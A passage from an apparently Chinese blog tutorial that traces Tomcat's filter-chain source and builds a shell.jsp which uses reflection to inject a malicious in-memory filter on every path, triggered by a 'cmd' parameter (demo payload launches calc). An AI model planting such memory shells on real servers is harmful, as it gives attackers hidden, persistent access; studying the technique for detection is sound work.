&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置<code>web.xml</code>，注册过滤器，在任意路径进行拦截</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cmdFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.filter.CmdFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>cmdFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动Tomcat服务器，最终效果如下</p><p><img src="/img/post/mem1.png" alt="mem1"></p><h2 id="逆向Filter注册"><a href="#逆向Filter注册" class="headerlink" title="逆向Filter注册"></a>逆向Filter注册</h2><p>正常情况下想要创建一个新过滤器，需要在后端编写过滤器源码、更新配置文件、重启服务器等操作。然而在攻击角度上看，我们不可能通过修改后端源码的方式去注册一个恶意Filter。所以一般情况下，我们需要将一个jsp文件上传至后端，通过访问该jsp文件执行后端代码注册Filter</p><p>接下来需要知道如何在程序运行时动态注册Filter</p><p>步入父类<code>HttpFilter</code>的<code>doFilter()</code>方法，发现从public修饰的<code>doFilter()</code>跳到了protected修饰的<code>doFilter()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(req <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp; res <span class="keyword">instanceof</span> HttpServletResponse)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;non-HTTP request or response&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.doFilter((HttpServletRequest) req, (HttpServletResponse) res, chain);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>protected修饰的<code>doFilter()</code>调用了chain的<code>doFilter()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(HttpServletRequest req, HttpServletResponse res, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        chain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>chain</code>是一个<code>ApplicationFilterChian</code>实例，其<code>filters</code>字段是一个数组，保存着注册的Filter</p><p><img src="/img/post/mem2.png" alt="mem2"></p><p>在<code>ApplicationFilterChian</code>类的<code>doFilter()</code>方法中，最后都会执行<code>internalDoFilter()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                AccessController.doPrivileged(() -&gt; &#123;</span><br><span class="line">                    <span class="built_in">this</span>.internalDoFilter(req, res);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PrivilegedActionException pe) &#123;</span><br><span class="line">                <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> pe.getException();</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (ServletException)e;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (IOException)e;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (RuntimeException)e;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.internalDoFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>internalDoFilter()</code>方法中，可以一窥Filter的工作机制。该方法从数组中每获取一个Filter后，指针就会顺移到下一个Filter，在<code>internalDoFilter()</code>内部又会执行当前取出Filter的<code>doFIlter()</code>，每次执行完<code>doFIlter()</code>后又会回到该方法，而这时数组的指针已经指向下一个Filter了，直至所有Filter完成拦截</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.pos &lt; <span class="built_in">this</span>.n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="built_in">this</span>.filters[<span class="built_in">this</span>.pos++];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !filterConfig.getFilterDef().getAsyncSupportedBoolean()) &#123;</span><br><span class="line">                    request.setAttribute(<span class="string">&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;</span>, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest)request).getUserPrincipal();</span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege(<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException | RuntimeException | IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">filter</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                ExceptionUtils.handleThrowable(filter);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), filter);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.dispatcherWrapsSameObject) &#123;</span><br><span class="line">                    lastServicedRequest.set(request);</span><br><span class="line">                    lastServicedResponse.set(response);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !<span class="built_in">this</span>.servletSupportsAsync) &#123;</span><br><span class="line">                    request.setAttribute(<span class="string">&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;</span>, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp; response <span class="keyword">instanceof</span> HttpServletResponse &amp;&amp; Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest)request).getUserPrincipal();</span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>, <span class="built_in">this</span>.servlet, classTypeUsedInService, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.servlet.service(request, response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException | RuntimeException | IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">filterConfig</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                ExceptionUtils.handleThrowable(filterConfig);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.servlet&quot;</span>), filterConfig);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.dispatcherWrapsSameObject) &#123;</span><br><span class="line">                    lastServicedRequest.set((Object)<span class="literal">null</span>);</span><br><span class="line">                    lastServicedResponse.set((Object)<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>还可以发现，<code>filters</code>是一个<code>ApplicationFilterConfig</code>数组而不是<code>Filter</code>数组，要对取出的<code>ApplicationFilterConfig</code>调用<code>getFilter()</code>方法才能获取<code>Filter</code>实例。当前的目标是得知<code>filters</code>在何时被赋值，因为该字段的声明中一开始是一个空数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>发现<code>ApplicationFilterChain</code>的<code>addFilter()</code>方法实现了对该字段的赋值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.filters[i] == filterConfig) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.n == <span class="built_in">this</span>.filters.length) &#123;</span><br><span class="line">            <span class="built_in">this</span>.filters = (ApplicationFilterConfig[])Arrays.copyOf(<span class="built_in">this</span>.filters, <span class="built_in">this</span>.n + <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.filters[<span class="built_in">this</span>.n++] = filterConfig;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查找调用了该方法的类，在<code>ApplicationFilterFactory</code>类的<code>creatFilterChain()</code>中调用了该方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (servlet == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ApplicationFilterChain filterChain;</span><br><span class="line">            <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">                <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request)request;</span><br><span class="line">                <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterChain = (ApplicationFilterChain)req.getFilterChain();</span><br><span class="line">                    <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                        req.setFilterChain(filterChain);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            filterChain.setServlet(servlet);</span><br><span class="line">            filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)wrapper.getParent();</span><br><span class="line">            filterChain.setDispatcherWrapsSameObject(context.getDispatcherWrapsSameObject());</span><br><span class="line">            FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">            <span class="keyword">if</span> (filterMaps != <span class="literal">null</span> &amp;&amp; filterMaps.length != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span> (DispatcherType)request.getAttribute(<span class="string">&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> FilterUtil.getRequestPath(request);</span><br><span class="line">                <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; FilterUtil.matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                        <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                            log.warn(sm.getString(<span class="string">&quot;applicationFilterFactory.noFilterConfig&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterMap.getFilterName()&#125;));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            filterChain.addFilter(filterConfig);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                        <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">                            log.warn(sm.getString(<span class="string">&quot;applicationFilterFactory.noFilterConfig&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterMap.getFilterName()&#125;));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            filterChain.addFilter(filterConfig);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> filterChain;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> filterChain;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>方法中，<code>filterChain</code>作为<code>ApplicationFilterChain</code>实例被声明，而后被赋值为<code>filterConfig</code>，<code>filterConfig</code>从<code>context.findFilterConfig(filterMap.getFilterName())</code>获取。所以从根本上<code>filters</code>字段的元素从<code>StandardContext</code>中获取</p><p><code>StandardContext</code>类中，<code>findFilterConfig()</code>方法指向<code>filterConfigs</code>字段，该字段为一个Map集合</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br></pre></td></tr></table></figure><p>调试可以发现，这个Map的键保存Filter的名称，值为FilterConfig对象</p><p><img src="/img/post/mem3.png" alt="mem3"></p><p>所以，获取<code>StandardContext</code>类，通过反射修改<code>filterConfigs</code>这个Map，使其包含我们的恶意ApplicationFilterConfig</p><p>进入<code>ApplicationFilterConfig</code>类，发现该类构造器需要一个<code>FilterDef</code>，<code>FilterDef</code>相当于配置文件中定义Filter名称和类路径的内容，并且后续调用<code>addFilterMap()</code>时会调用<code>FilterDef</code>进行检查</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addFilterMap</span><span class="params">(FilterMap filterMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.validateFilterMap(filterMap);</span><br><span class="line">        <span class="built_in">this</span>.filterMaps.add(filterMap);</span><br><span class="line">        <span class="built_in">this</span>.fireContainerEvent(<span class="string">&quot;addFilterMap&quot;</span>, filterMap);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了<code>validateFilterMap()</code></p><p><img src="/img/post/mem4.png" alt="mem4"></p><p>因而设置<code>FilterDef</code>是必要的，<code>Name</code>、<code>Filter</code>两个字段是必须的，<code>Filter</code>用于提供现有实例，因为运行时一般不会再进行类加载，<code>FilterClass</code>字段经过我的测试并不是必须的，但考虑到后面可能会出现的空指针，这里可以随便设置一个，设置完后将其加入context</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(cmdFilter.getClass().getName());</span><br><span class="line">filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">CmdFilter</span>());</span><br><span class="line">context.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><p>而且我们还可以通过走<code>FilterDef</code>去给<code>ApplicationFilterConfig</code>传递Filter对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationFilterConfig(Context context, FilterDef filterDef) <span class="keyword">throws</span> ClassCastException, ReflectiveOperationException, ServletException, NamingException, IllegalArgumentException, SecurityException &#123;</span><br><span class="line">        <span class="built_in">this</span>.context = context;</span><br><span class="line">        <span class="built_in">this</span>.filterDef = filterDef;</span><br><span class="line">        <span class="keyword">if</span> (filterDef.getFilter() == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.getFilter();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.filter = filterDef.getFilter();</span><br><span class="line">            context.getInstanceManager().newInstance(<span class="built_in">this</span>.filter);</span><br><span class="line">            <span class="built_in">this</span>.initFilter();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此外，<code>creatFilterChain()</code>方法中通过<code>filterMap.getFilterName()</code>来查找<code>FilterConfigs</code>，故还需要添加一个新<code>FilterMap</code>进入<code>context</code>，通常只需设置<code>FilterName</code>和<code>URLPattern</code>即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">context.addFilterMap(filterMap);</span><br></pre></td></tr></table></figure><h2 id="构造Filter内存马"><a href="#构造Filter内存马" class="headerlink" title="构造Filter内存马"></a>构造Filter内存马</h2><p>完事具备，接下来着手构建内存马触发页面<code>shell.jsp</code>，首先要获取<code>StandardContext</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p>创建恶意Filter，让它弹个计算器</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>.doFilter(req, res, chain);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建恶意ApplicationFilterConfig，并让新<code>FilterMap</code>进入<code>context</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(cmdFilter.getClass().getName());</span><br><span class="line">filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">CmdFilter</span>());</span><br><span class="line">context.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) </span><br><span class="line">constructor.newInstance(context, filterDef);</span><br><span class="line"></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;CmdFilter&quot;</span>);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">context.addFilterMap(filterMap);</span><br></pre></td></tr></table></figure><p>将恶意ApplicationFilterConfig加入<code>filterConfigs</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(context);</span><br><span class="line">filterConfigs.put(<span class="string">&quot;CmdFilter&quot;</span>, filterConfig);</span><br></pre></td></tr></table></figure><p>完整的<code>shell.jsp</code></p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CmdFilter</span> <span class="keyword">extends</span> <span class="title class_">HttpFilter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.doFilter(req, res, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="type">CmdFilter</span> <span class="variable">cmdFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 